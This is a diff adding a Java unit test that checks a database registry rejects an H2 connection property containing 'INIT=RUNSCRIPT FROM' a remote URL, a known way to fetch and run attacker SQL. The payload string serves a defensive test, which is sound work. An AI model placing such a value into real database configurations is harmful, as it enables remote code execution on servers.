@@ -319,6 +319,18 @@ public class DefaultDatabaseRegistryTest extends AbstractOrientdbServiceTest {
   }
 
   @Test
+  public void test_h2_database_rejects_an_init_connection_property() {
+    Database database = createH2Database(Usage.STORAGE, "jdbc:h2:file:opal");
+    database.getSqlSettings().setProperties("INIT=RUNSCRIPT FROM 'https://elsewhere.example/payload.sql'");
+    try {
+      databaseRegistry.create(database);
+      fail("Expected an InvalidH2DatabaseException");
+    } catch(InvalidH2DatabaseException ignored) {
+    }
+    assertThat(databaseRegistry.listSqlDatabases()).isEmpty();
+  }
+
+  @Test
   public void test_h2_database_usage_is_validated_on_update() {
     Database database = createH2Database(Usage.STORAGE, "jdbc:h2:file:opal");
     databaseRegistry.create(database);
